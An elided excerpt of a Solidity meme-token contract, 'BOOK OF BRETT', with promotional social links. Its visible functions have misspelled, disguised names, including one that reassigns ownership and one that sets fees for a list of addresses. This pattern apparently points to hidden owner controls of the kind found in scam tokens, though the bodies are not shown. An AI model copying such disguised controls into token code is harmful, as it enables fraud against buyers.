...
/**
https://t.me/BOOKOFBRETT_0XBOOK
https://twitter.com/BOOKOFBRETT_
Guys, guess what I found on the cliff. BOOK OF BRETT!
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipstobdghty(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract BOOKOFBRETT is Ownable {
    ...
    constructor (){
        name = unicode"BOOK OF BRETT";
        symbol = unicode"BOOB";
        decimals = 9;
        uint256 Supply = 6969690000;
    ...
    function Aprrovese(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burnlpsger(address user) public {
